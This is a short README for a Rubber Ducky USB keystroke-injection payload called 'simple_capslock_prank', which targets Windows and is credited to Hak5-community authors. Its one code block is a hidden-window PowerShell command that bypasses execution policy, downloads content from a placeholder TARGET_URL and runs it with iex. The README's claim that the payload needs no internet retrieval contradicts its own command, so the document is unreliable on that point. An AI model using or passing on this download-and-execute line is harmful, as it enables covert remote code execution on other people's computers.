
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# simple_capslock_prank

## Description
This is a small exploit that is meant to be used with the RubberDucky flashdrive device. I have taken inspiration from another security researcher called atomiczsec. He wrote the original script but I have adapted it and made it in-line deployable, meaning it does not require the retrieval of any files through the internet. In addition, I used the video tutorial by Darren Kitchen(Hak5) at https://www.youtube.com/watch?v=DYhu5yg_OzA. 
## Getting Started

### Dependencies

- Windows 10,11
- None for this inline version, should work standalone upon deployment through RubberDucky

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

- Plug in your device
- Define the `DEFINE TARGET_URL example.com`
- Device will download both files and place them in proper directories to then run the script

```
powershell -w h -NoP -NonI -ep Bypass $pl = iwr TARGET_URL dl=1; iex $pl
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here:

GitHub @[dragoseven](https://github.com/dragoseven) 

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

- 1.0
  - Test v1

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->

## Acknowledgments

- [Hak5](https://hak5.org/)
- [I-Am-Jakoby](https://github.com/I-Am-Jakoby)
- [atomiczsec](https://github.com/atomiczsec)

<p align="right">(<a href="#top">back to top</a>)</p>
